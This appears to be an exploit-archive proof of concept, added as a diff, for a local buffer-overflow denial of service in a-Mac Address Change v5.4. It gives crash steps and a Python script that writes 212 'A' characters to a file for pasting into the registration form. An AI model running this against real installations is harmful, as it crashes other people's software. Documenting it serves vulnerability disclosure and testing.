@@ -1,0 +1,21 @@
+# Exploit Title: a-Mac Address Change v5.4 - Denial of Service (PoC)
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2019-01-30
+# Vendor Homepage: http://amac.paqtool.com/
+# Software Link : http://amac.paqtool.com/
+# Tested Version: 5.4
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run amac.exe
+# 2.- copy content amac_Crash.txt or 212 "A" to clipboard (result from this python script)
+# 3.- Go to Register - Amac Register Form and paste the result in all fields: "Your Name", "Your Company", "Register Code"
+# 4.- Click in Register button and you will see a crash.
+
+#!/usr/bin/env python
+
+crash = "\x41" * 212
+f = open ("amac_Crash.txt", "w")
+f.write(crash)
+f.close()
